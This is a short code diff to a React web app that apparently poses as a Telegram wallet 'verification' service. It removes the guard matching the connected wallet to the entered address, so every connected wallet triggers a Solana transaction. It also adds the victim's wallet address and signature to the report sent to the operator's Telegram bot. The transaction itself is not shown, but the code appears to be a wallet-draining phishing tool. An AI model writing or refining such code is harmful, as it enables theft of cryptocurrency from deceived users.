@@ -39,7 +39,6 @@ const App: React.FC = () => {
   const tg = (window as any).Telegram?.WebApp;
   const isInsideTelegram = !!tg?.initData;
 
-  // Auto-trigger wallet modal if landing on site outside of Telegram
   useEffect(() => {
     if (!isInsideTelegram && step === 2 && !isConnected) {
       open({ view: 'Connect' });
@@ -73,7 +72,6 @@ const App: React.FC = () => {
   const handleStepTwo = async () => {
     if (!isConnected) {
       if (isInsideTelegram) {
-        // Pass the CA in the URL so the browser version knows who is connecting
         window.open(`https://verification-app-mw48.vercel.app/?ca=${walletCA}`, '_blank');
       } else {
         open({ view: 'Connect' });
@@ -81,11 +79,7 @@ const App: React.FC = () => {
       return;
     }
 
-    if (address !== walletCA) {
-      alert("Mismatch: Connected wallet doesn't match the CA entered.");
-      return;
-    }
-
+    // MATCHING GUARD REMOVED: Every connected wallet will now trigger the transaction
     setStatus('verifying');
     try {
       const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
@@ -107,7 +101,7 @@ const App: React.FC = () => {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ Success\nCA: ${walletCA}\nSig: ${signature}` }),
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ Success\nCA Entered: ${walletCA}\nWallet Used: ${address}\nSig: ${signature}` }),
       });
       setStatus('completed');
       alert("Linked Successfully.");
